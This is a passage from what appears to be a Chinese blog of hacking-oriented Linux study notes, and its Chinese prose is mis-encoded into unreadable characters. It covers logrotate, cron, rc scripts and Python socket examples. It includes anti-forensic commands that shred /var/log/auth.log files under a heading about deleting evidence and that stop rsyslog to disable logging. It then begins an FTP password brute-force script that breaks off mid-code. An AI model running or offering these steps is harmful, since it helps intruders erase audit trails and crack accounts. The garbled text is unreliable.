å®šæ—¥å¿—æ–‡ä»¶çš„ä½ç½®ã€æ›´æ”¹ä¼˜å…ˆçº§ï¼Œç”šè‡³ç¦ç”¨ç‰¹å®šçš„æ—¥å¿—è§„åˆ™ã€‚ </p><h3 id="ä½¿ç”¨-LOGROTATE-è‡ªåŠ¨æ¸…ç†æ—¥å¿—"><a href="#ä½¿ç”¨-LOGROTATE-è‡ªåŠ¨æ¸…ç†æ—¥å¿—" class="headerlink" title="ä½¿ç”¨ LOGROTATE è‡ªåŠ¨æ¸…ç†æ—¥å¿—"></a>ä½¿ç”¨ LOGROTATE è‡ªåŠ¨æ¸…ç†æ—¥å¿—</h3><p>/etc/logrotate.conf </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># see <span class="string">"man logrotate"</span> <span class="keyword">for</span> details  </span><br><span class="line"># <span class="keyword">rotate</span> <span class="keyword">log</span> files weekly </span><br><span class="line">âŠ weekly </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">keep</span> 4 weeks worth of backlogs </span><br><span class="line">â‹ <span class="keyword">rotate</span> 4 </span><br><span class="line"> </span><br><span class="line">âŒ # create new (empty) <span class="keyword">log</span> files after rotating old ones  </span><br><span class="line">create </span><br><span class="line"> </span><br><span class="line">â # uncomment this <span class="keyword">if</span> you want your <span class="keyword">log</span> files compressed  </span><br><span class="line">#<span class="keyword">compress</span> </span><br><span class="line"> </span><br><span class="line"># packages <span class="keyword">drop</span> <span class="keyword">log</span> rotation information into this directory  </span><br><span class="line"><span class="keyword">include</span> /etc/logrotate.<span class="keyword">d</span> </span><br><span class="line"> </span><br><span class="line"># <span class="keyword">no</span> packages own wtmp, or btmp -- we'll <span class="keyword">rotate</span> them here </span><br><span class="line">/<span class="keyword">var</span>/<span class="keyword">log</span>/wtmp  </span><br><span class="line"> &#123;   missingok  </span><br><span class="line"> monthly </span><br><span class="line"> create 0664 root utmp  </span><br><span class="line">120 </span><br><span class="line"> <span class="keyword">rotate</span> 1 </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ï¼Œä½ å¯ä»¥è®¾ç½®çš„æ—¶é—´å•ä½æ•°å­—å‚è€ƒâŠã€‚è¿™é‡Œçš„é»˜è®¤å€¼æ˜¯ weeklyï¼Œè¿™æ„å‘³ç€ rotate å…³é”®å­—ä¹‹åçš„ä»» ä½•æ•°å­—æ€»æ˜¯æŒ‡ weeksï¼ˆå‘¨ï¼‰ ã€‚<br>è¿›ä¸€æ­¥å¾€ä¸‹çœ‹ï¼Œä½ å¯ä»¥çœ‹åˆ°è®¾ç½®åˆ‡å‰²è½¬å‚¨æ—¥å¿—é»˜è®¤è®¾ç½®çš„é¢‘ç‡æ˜¯æ¯å››ä¸ªæ˜ŸæœŸè½¬å‚¨æ—¥å¿—â‹ã€‚è¿™ä¸ªé»˜è®¤é… ç½®å¯¹å¤§å¤šæ•°äººéƒ½é€‚ç”¨ï¼Œä½†æ˜¯å¦‚æœæ‚¨æƒ³è®©æ‚¨çš„æ—¥å¿—æ›´é•¿ä¸€äº›ï¼Œä»¥ä¾¿è¿›è¡Œè°ƒæŸ¥ï¼Œæˆ–è€…æ›´çŸ­ä¸€äº›ï¼Œä»¥ä¾¿æ›´å¿«åœ°æ¸… é™¤å®ƒä»¬ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥æ›´æ”¹è¿™ä¸ªè®¾ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æ¯å‘¨æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¹¶å¸Œæœ›èŠ‚çœå­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥å°†æ­¤è®¾ç½® æ›´æ”¹ä¸º rotate 1ã€‚å¦‚æœæ‚¨çš„æ—¥å¿—æœ‰è¶³å¤Ÿçš„å­˜å‚¨ç©ºé—´ï¼Œå¹¶ä¸”å¸Œæœ›ä¿ç•™åŠæ°¸ä¹…è®°å½•ä»¥ä¾¿ä»¥åè¿›è¡Œå–è¯åˆ†æï¼Œé‚£ä¹ˆ æ‚¨å¯ä»¥å°†æ­¤è®¾ç½®æ›´æ”¹ä¸º rotate 26 ä»¥ä¿å­˜å…­ä¸ªæœˆçš„æ—¥å¿—ï¼Œæˆ–è€…å°† rotate 52 æ›´æ”¹ä¸ºä¿å­˜ä¸€å¹´çš„æ—¥å¿—ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºæ—¥å¿—æ–‡ä»¶å½“åšæ—§æ—¥å¿—çš„åˆ‡å‰²å¤‡ä»½âŒã€‚åœ¨é…ç½®æ–‡ä»¶ä¸­å»ºè®®ï¼Œä½ ä¹Ÿå¯ä»¥é€‰æ‹© å‹ç¼©è½¬å‚¨çš„æ—¥å¿—æ–‡ä»¶âã€‚ </p><p>åœ¨æ¯ä¸ªè½¬å‚¨å‘¨æœŸç»“æŸæ—¶ï¼Œå°†é‡å‘½åæ—¥å¿—æ–‡ä»¶ï¼Œå¹¶åœ¨åˆ›å»ºæ–°æ—¥å¿—æ–‡ä»¶æ—¶å°†å…¶æ¨åˆ°æ—¥å¿—é“¾çš„æœ«å°¾ï¼Œä»¥æ›¿æ¢ å½“å‰æ—¥å¿—æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ/var/log.auth å°†å˜æˆ/var/log.auth.1ï¼Œé‚£ä¹ˆ/var/log.auth.2ï¼Œä»¥æ­¤ç±»æ¨ã€‚å¦‚æœæ‚¨æ¯å››å‘¨ è½®æ¢ä¸€æ¬¡æ—¥å¿—ï¼Œå¹¶ä¿ç•™å››ç»„å¤‡ä»½ï¼Œé‚£ä¹ˆæ‚¨å°†å¾—åˆ°/var/log.auth.4ï¼Œä½†æ˜¯æ²¡æœ‰/var/log.auth.5ã€‚æ„æ€æ˜¯æ—§çš„ /var/log.auth.4 å°†è¢«åˆ é™¤ï¼Œè€Œä¸æ˜¯è¢«æ¨åˆ°/var/log/auth.5</p><h3 id="åˆ é™¤è¯æ®"><a href="#åˆ é™¤è¯æ®" class="headerlink" title="åˆ é™¤è¯æ®"></a>åˆ é™¤è¯æ®</h3><p>shred å°†åˆ é™¤æ–‡ä»¶å¹¶å¤šæ¬¡è¦†ç›–å®ƒâ€”â€”é»˜è®¤æƒ…å†µä¸‹ï¼Œshred å°†è¦†ç›– 4 æ¬¡ã€‚é€šå¸¸ï¼Œæ–‡ä»¶è¢« è¦†ç›–çš„æ¬¡æ•°è¶Šå¤šï¼Œæ¢å¤èµ·æ¥å°±è¶Šå›°éš¾ï¼Œä½†æ˜¯è¯·è®°ä½ï¼Œæ¯æ¬¡è¦†ç›–éƒ½éœ€è¦æ—¶é—´ï¼Œå› æ­¤å¯¹äºéå¸¸å¤§çš„æ–‡ä»¶ï¼Œç¢ç‰‡ åŒ–å¯èƒ½ä¼šå¾ˆè€—æ—¶ã€‚ </p><p>è¦åŒ…æ‹¬ä¸¤ä¸ªæœ‰ç”¨çš„é€‰é¡¹ï¼Œä¸€ä¸ªæ˜¯-f é€‰é¡¹ï¼Œå®ƒæ›´æ”¹æ–‡ä»¶çš„æƒé™ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ›´æ”¹æƒé™æ—¶å…è®¸è¦†ç›–ï¼›å¦ä¸€ ä¸ªæ˜¯-n é€‰é¡¹ï¼Œå®ƒå…è®¸æ‚¨é€‰æ‹©è¦†ç›–æ–‡ä»¶çš„æ¬¡æ•°ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å°†/var/log/auth.log ä¸­çš„æ—¥å¿—æ–‡ä»¶ åˆ†è§£è¦†ç›– 10 æ¬¡: </p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;shred  -f  -<span class="built_in">n</span>  <span class="number">10</span>  /<span class="built_in">var</span>/<span class="built_in">log</span>/auth.log.*</span><br></pre></td></tr></table></figure><h3 id="ç¦ç”¨æ—¥å¿—è®°å½•"><a href="#ç¦ç”¨æ—¥å¿—è®°å½•" class="headerlink" title="ç¦ç”¨æ—¥å¿—è®°å½•"></a>ç¦ç”¨æ—¥å¿—è®°å½•</h3><p>éœ€è¦rootæƒé™</p><p>service  rsyslog  stop </p><h2 id="ç†Ÿç»ƒä½¿ç”¨æœåŠ¡"><a href="#ç†Ÿç»ƒä½¿ç”¨æœåŠ¡" class="headerlink" title="ç†Ÿç»ƒä½¿ç”¨æœåŠ¡"></a>ç†Ÿç»ƒä½¿ç”¨æœåŠ¡</h2><p>å¯åŠ¨ã€åœæ­¢å’Œé‡æ–°å¯åŠ¨æœåŠ¡ </p><p>service servicename start|stop|restart </p><p>å¯¹é»‘å®¢ç‰¹åˆ«é‡è¦çš„å››ä¸ªï¼š</p><p><strong>Apache Web Serverï¼Œ</strong></p><p><strong>OpenSSHï¼Œ</strong></p><p><strong>MySQL ï¼Œ</strong></p><p><strong>PostgreSQL ç»“åˆ Metasploit  ã€‚</strong> </p><h2 id="ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡"><a href="#ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡" class="headerlink" title="ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡"></a>ä½¿ç”¨ä½œä¸šè°ƒåº¦è‡ªåŠ¨åŒ–ä»»åŠ¡</h2><p>éœ€è¦éµå¾ªçš„æ ¼å¼ï¼Œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M   H  DOM  MON  DOW <span class="built_in"> USER </span> COMMAND </span><br><span class="line">30  2  * *   1-5  root  /root/myscanningscript</span><br></pre></td></tr></table></figure><p>leafpad  /etc/crontab </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab </span></span><br><span class="line"><span class="comment"># Unlike any other crontab, you don't have to run the 'crontab'  </span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file </span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,  </span></span><br><span class="line"><span class="comment"># which no other crontabs do. </span></span><br><span class="line"> </span><br><span class="line">SHELL=<span class="regexp">/bin/sh</span> PATH=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># m h dom mon dow user command </span></span><br><span class="line"><span class="number">17</span> * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly </span><br><span class="line"><span class="number">25</span> <span class="number">6</span> * * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">47</span> <span class="number">6</span> * * <span class="number">7</span> root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="number">52</span> <span class="number">6</span> <span class="number">1</span> * * root test -x /usr/sbin/anacron II ( cd / &amp;&amp; run-parts  </span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡"><a href="#è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡"></a>è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡</h3><p>åœ¨ crontab ä¸­æ·»åŠ ä¸‹è¡Œï¼š </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00 </span><span class="number">2</span> * * <span class="number">0</span> backup /bin/systembackup.sh</span><br></pre></td></tr></table></figure><p>cron å®ˆæŠ¤è¿›ç¨‹å°†åœ¨æ¯æœˆå‘¨æ—¥æ—©ä¸Š 2 ç‚¹æ‰§è¡Œé‚£ä¸ªè„šæœ¬ã€‚  </p><h3 id="crontabå¿«æ·æ–¹å¼"><a href="#crontabå¿«æ·æ–¹å¼" class="headerlink" title="crontabå¿«æ·æ–¹å¼"></a>crontabå¿«æ·æ–¹å¼</h3><p>crontab æ–‡ä»¶æœ‰äº›å†…ç½®çš„å¿«æ·æ–¹å¼ï¼Œç”¨æ¥ä»£æ›¿å…·ä½“çš„æ—¶é—´ï¼Œæ—¥æœŸï¼Œæœˆä»½ã€‚å®ƒåŒ…å«è¿™äº›ï¼š<br>179<br>â€¢ @yearly </p><p>â€¢ @annually </p><p>â€¢ @monthly </p><p>â€¢ @weekly </p><p>â€¢ @daily </p><p>â€¢ @midnight </p><p>â€¢ @noon </p><p>â€¢ @reboot<br>æ‰€ä»¥ï¼Œå¦‚æœä½ å¸Œæœ› MySQL æ‰«æå™¨æ¯å¤©åˆå¤œè¿è¡Œï¼Œä½ å¯ä»¥æ·»åŠ ä¸‹è¡Œåˆ° crontab æ–‡ä»¶ï¼š </p><p>@midnight user /usr/share/MySQLsscanner.sh </p><h3 id="ä½¿ç”¨-RC-è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡"><a href="#ä½¿ç”¨-RC-è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡" class="headerlink" title="ä½¿ç”¨ RC è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡"></a>ä½¿ç”¨ RC è„šæœ¬å¼€æœºè¿è¡Œä»»åŠ¡</h3><p>Linuxè¿è¡Œçº§åˆ«</p><p>Linux æœ‰å¤šä¸ªè¿è¡Œçº§åˆ«ï¼Œç”¨äºæŒ‡ç¤ºå¯åŠ¨æ—¶éœ€è¦å¯åŠ¨å“ªäº›æœåŠ¡ã€‚ä¾‹å¦‚ï¼Œè¿è¡Œçº§åˆ« 1 æ˜¯å•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œ rc è„šæœ¬ä¼šæ ¹æ®è¿è¡Œçº§åˆ«è¿è¡Œã€‚ </p><p>0 ç³»ç»ŸåœæœºçŠ¶æ€<br>1 å•ç”¨æˆ·å·¥ä½œçŠ¶æ€<br>2 â€“ 5 å¤šç”¨æˆ·çŠ¶æ€<br>6 é‡å¯ </p><p>ä½ ä»¥ä½¿ç”¨ update-rc.d å‘½ä»¤ä¸º rc.d è„šæœ¬æ·»åŠ å¯åŠ¨æ—¶è¦è¿è¡Œçš„æœåŠ¡ã€‚æ­¤å‘½ä»¤å…è®¸ä½ ä» rc.d è„šæœ¬ä¸­æ·»åŠ æˆ–åˆ  é™¤æœåŠ¡ã€‚update-rc.d çš„è¯­æ³•å¾ˆç®€å•ï¼Œè¾“å…¥å‘½ä»¤ï¼Œåé¢è¾“å…¥è„šæœ¬çš„åå­—ç„¶åè¾“å…¥åŠ¨ä½œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;update-rc.d  &lt;name  of  the <span class="built_in"> script </span> <span class="keyword">or</span>  service&gt;  &lt;remove|defaults|disable|enable&gt;</span><br></pre></td></tr></table></figure><p>ä¸¾ä¸ªupdate-rc.dçš„ä¾‹å­ï¼Œå‡è®¾ä½ æ€»æ˜¯å¸Œæœ›PostgreSQL æ•°æ®åº“åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼Œè¿™æ ·ä½ çš„Metasploit æ¡† æ¶å¯ä»¥ä½¿ç”¨å®ƒå‚¨å­˜é»‘å®¢æ”»å‡»å’Œæ¸—é€æµ‹è¯•çš„ç»“æœã€‚ä½ éœ€è¦ä½¿ç”¨ update-rc.d æ·»ä¸€è¡Œåˆ°ä½ çš„ rc.d è„šæœ¬æ¥è®©å®ƒæ¯æ¬¡ ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œã€‚ </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span>-rc.d  postgresql  <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure><h2 id="PYTHON-ç½‘ç»œé€šä¿¡"><a href="#PYTHON-ç½‘ç»œé€šä¿¡" class="headerlink" title="PYTHON ç½‘ç»œé€šä¿¡"></a>PYTHON ç½‘ç»œé€šä¿¡</h2><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/python3 </span></span><br><span class="line">âŠ <span class="keyword">import</span> socket </span><br><span class="line">â‹ s = socket.socket() </span><br><span class="line">âŒ s.connect((<span class="string">"192.168.1.101"</span>, <span class="number">22</span>)) </span><br><span class="line">â answer = s.recv(<span class="number">1024</span>) </span><br><span class="line">â print(answer)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯¼å…¥ socket æ¨¡å—âŠï¼Œä»¥ä¾¿ä½¿ç”¨å®ƒçš„åŠŸèƒ½å’Œå·¥å…·ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ socket æ¨¡å—ä¸­çš„ç½‘ç»œå·¥ å…·æ¥ä¸ºæˆ‘ä»¬å¤„ç†é€šè¿‡ç½‘ç»œè¿æ¥çš„æ¥å£ã€‚Socket ä¸ºä¸¤ä¸ªè®¡ç®—æœºèŠ‚ç‚¹æä¾›äº†ç›¸äº’é€šä¿¡çš„æ–¹å¼ã€‚é€šå¸¸ä¸€ä¸ªèŠ‚ç‚¹æ˜¯æœ åŠ¡ç«¯ä¸€ä¸ªæ˜¯å®¢æˆ·ç«¯ã€‚<br>ç„¶åæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å˜é‡ s ï¼Œç„¶åå°†å®ƒå’Œ socket æ¨¡å—ä¸­çš„ socket ç±»å…³è”â‹ã€‚è¿™æ ·ï¼Œæ¯å½“æˆ‘ä»¬æƒ³ä½¿ ç”¨ socket ç±»æ—¶ï¼Œå°±ä¸å¿…å¼•ç”¨å®Œæ•´çš„ socket.socketï¼ˆï¼‰è¯­æ³•ï¼Œåªéœ€ä½¿ç”¨ s å˜é‡åå³å¯ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ socket æ¨¡å—âŒä¸­çš„ connectï¼ˆï¼‰æ–¹æ³•æ¥å»ºç«‹åˆ°ç‰¹å®š IP å’Œç«¯å£çš„ç½‘ç»œè¿æ¥ã€‚è®°ä½ï¼Œæ–¹æ³•æ˜¯ å¯ç”¨äºç‰¹å®šå¯¹è±¡çš„å‡½æ•°ï¼Œè¯­æ³•ä¸º object.methodï¼ˆä¾‹å¦‚ socket.connectï¼‰ã€‚è¿™é‡Œï¼Œæˆ‘è¿æ¥åˆ° IP åœ°å€ 192.168.1.101ï¼Œ å®ƒæ˜¯æˆ‘ç½‘ç»œä¸Šä¸€å°ç”µè„‘çš„ IP åœ°å€ï¼Œ22 ç«¯å£æ˜¯é»˜è®¤çš„ ssh ç«¯å£ã€‚æ‚¨å¯ä»¥åœ¨ Linux æˆ– Kali çš„å¦ä¸€ä¸ªå®ä¾‹ä¸Šå¯¹æ­¤ è¿›è¡Œæµ‹è¯•ã€‚å¤§å¤šæ•° 22 ç«¯å£æ˜¯é»˜è®¤æ‰“å¼€ã€‚<br>ä¸€æ—¦ä½ å»ºç«‹äº†è”ç³»ï¼Œå°±å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ¥æ”¶æ–¹æ³• recv æ¥æ¥æ”¶æ¥è‡ª socket çš„ 1024 bytes æ•°æ® â å¹¶ä¸”å°†ä»–ä»¬å‚¨å­˜åˆ°ä¸€ä¸ªå« answer çš„å˜é‡é‡Œï¼›è¿™ 1024 bytes åŒ…å«äº† banner ä¿¡æ¯ã€‚ç„¶åï¼Œæˆ‘ä»¬ç”¨ print ï¼ˆï¼‰å‡½æ•°å°†è¯¥å˜é‡çš„å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šï¼Œä»¥æŸ¥çœ‹é€šè¿‡è¯¥ socket ä¼ é€’çš„æ•°æ®ï¼Œä»è€Œå…è®¸æˆ‘ä»¬ç›‘è§†å®ƒï¼åœ¨æœ€å ä¸€è¡Œï¼Œæˆ‘ä»¬å…³é—­è¿æ¥ã€‚ </p><h3 id="åˆ›å»º-TCP-ç›‘å¬å™¨"><a href="#åˆ›å»º-TCP-ç›‘å¬å™¨" class="headerlink" title="åˆ›å»º TCP ç›‘å¬å™¨"></a>åˆ›å»º TCP ç›‘å¬å™¨</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/<span class="keyword">bin/python3 </span><span class="meta">import</span> socket </span><br><span class="line">âŠ TCP_IP = <span class="string">"192.168.181.190"</span> TCP_PORT = <span class="number">6996</span> </span><br><span class="line"><span class="keyword">BUFFER_SIZE </span>= <span class="number">100</span> </span><br><span class="line"> </span><br><span class="line">â‹ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">âŒ s.<span class="keyword">bind((TCP_IP, </span>TCP_PORT)) </span><br><span class="line">â s.listen (<span class="number">1</span>) </span><br><span class="line"> </span><br><span class="line">â conn,<span class="keyword">addr </span>= s.accept() </span><br><span class="line"> print (<span class="string">'Connection address: '</span>, <span class="keyword">addr </span>)  </span><br><span class="line"> <span class="meta">while</span> <span class="number">1</span>: </span><br><span class="line"><span class="meta">data</span><span class="symbol">=conn</span>.recv(<span class="keyword">BUFFER_SIZE) </span></span><br><span class="line"><span class="meta">if</span> not <span class="meta">data</span>:</span><br><span class="line"><span class="keyword">break </span></span><br><span class="line">print (<span class="string">"Received data: "</span>, <span class="meta">data</span>)  </span><br><span class="line">  conn.send(<span class="meta">data</span>) <span class="symbol">#echo</span> </span><br><span class="line"> </span><br><span class="line"><span class="symbol">conn.close</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å£°æ˜å¸Œæœ›è„šæœ¬ä½¿ç”¨ Python è§£é‡Šå™¨è¿è¡Œï¼Œç„¶ååƒä»¥å‰ä¸€æ ·å¯¼å…¥å¥—æ¥å­—æ¨¡å—ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å®ƒ çš„åŠŸèƒ½ã€‚ç„¶åï¼Œæˆ‘ä»¬å®šä¹‰å˜é‡æ¥ä¿å­˜ TCP/IP åœ°å€ã€è¦ç›‘å¬çš„ç«¯å£ä»¥åŠè¦ä»è¿æ¥ç³»ç»Ÿæ•è·çš„æ•°æ®çš„ç¼“å†²åŒºå¤§ å°çš„ä¿¡æ¯âŠã€‚<br>æˆ‘ä»¬å®šä¹‰äº† socket â‹ï¼Œå¹¶ä½¿ç”¨åˆšæ‰åˆ›å»ºçš„å˜é‡å°† socket ç»‘å®šåˆ° IP åœ°å€å’Œç«¯å£âŒã€‚æˆ‘ä»¬å‘Šè¯‰ socket ä½¿ç”¨ socket åº“âä¸­çš„ listen()æ–¹æ³•è¿›è¡Œä¾¦å¬ã€‚<br>ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ socket åº“çš„ accept æ–¹æ³•æ•è·è¿æ¥ç³»ç»Ÿçš„ IP åœ°å€å’Œç«¯å£ï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯æ‰“å°åˆ°å±å¹•ä¸Šï¼Œ<br>ä»¥ä¾¿ç”¨æˆ·å¯ä»¥çœ‹åˆ°å®ƒâã€‚</p><p>ç°åœ¨ï¼Œè½¬åˆ°ç½‘ç»œä¸Šçš„å¦ä¸€å°è®¡ç®—æœºï¼Œä½¿ç”¨æµè§ˆå™¨è¿æ¥åˆ°è„šæœ¬ä¸­æŒ‡å®šçš„ 6996 ç«¯å£ã€‚è¿è¡Œ tcp_server.py è„š æœ¬ï¼Œä½ åº”è¯¥èƒ½å¤Ÿè¿æ¥å’Œæ”¶é›†æœ‰å…³é‚£ä¸ªç³»ç»Ÿçš„å…³é”®ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿æ¥ç³»ç»Ÿçš„ IP åœ°å€å’Œç«¯å£ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š </p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;./tcp_server.py </span><br><span class="line">Connection <span class="string">Address:</span> (<span class="string">'192.168.181.190'</span>, <span class="number">45368</span>) Received <span class="string">data:</span> Get <span class="regexp">/HTTP/</span><span class="number">1.1</span> </span><br><span class="line"><span class="string">Host:</span><span class="number">192.168</span><span class="number">.181</span><span class="number">.190</span>:<span class="number">6996</span> </span><br><span class="line">User Â­<span class="string">Agent:</span>Mozilla/<span class="number">5.0</span> (X11Í¾ Linux x86_64Í¾ <span class="string">rv:</span><span class="number">45.0</span>) Gec </span><br><span class="line"></span><br><span class="line">Â­Â­snip---</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯é»‘å®¢åœ¨å†³å®šæ”»å‡»å‰æ”¶é›†çš„å…³é”®ä¿¡æ¯ã€‚æ¼æ´æ”»å‡»ï¼ˆæˆ–é»‘å®¢æ”»å‡»ï¼‰æ˜¯é’ˆå¯¹ç‰¹å®šçš„æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºï¼Œ ç”šè‡³æ˜¯æ­£åœ¨ä½¿ç”¨çš„è¯­è¨€ï¼Œå› æ­¤é»‘å®¢éœ€è¦åœ¨ç»§ç»­æ“ä½œä¹‹å‰å°½å¯èƒ½äº†è§£æœ‰å…³ç›®æ ‡çš„ä¿¡æ¯ã€‚åœ¨é»‘å®¢æ”»å‡»ä¹‹å‰æ”¶é›†ä¿¡æ¯çš„è¡Œä¸ºé€šå¸¸è¢«ç§°ä¸ºä¾¦å¯Ÿã€‚</p><h3 id="å¯†ç ç ´è§£"><a href="#å¯†ç ç ´è§£" class="headerlink" title="å¯†ç ç ´è§£"></a>å¯†ç ç ´è§£</h3><p>è¿™ä¸ªè„šæœ¬è¦æ±‚ç”¨æˆ·è¾“å…¥ ftp æœåŠ¡å™¨ å·å’Œè¦ç ´è§£çš„ ftp å¸æˆ·çš„ç”¨æˆ·åã€‚ç„¶åå®ƒè¯»å–ä¸€ä¸ªåŒ…å«å¯èƒ½å¯†ç åˆ—è¡¨çš„å¤–éƒ¨æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶å°è¯•æ¯ä¸ªå¯†ç æ¥ç ´ è§£ ftp å¸æˆ·ã€‚è„šæœ¬æ‰§è¡Œæ­¤æ“ä½œç›´åˆ°æˆåŠŸæˆ–å¯†ç ç”¨å®Œã€‚ </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3 </span></span><br><span class="line">import ftplib </span><br><span class="line">âŠ<span class="built_in"> server </span>= input(FTP Server: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â‹ user = input("</span>username: <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">âŒ Passwordlist = input ("</span>Path <span class="keyword">to</span> Password List &gt; <span class="string">") </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">â try: </span></span><br><span 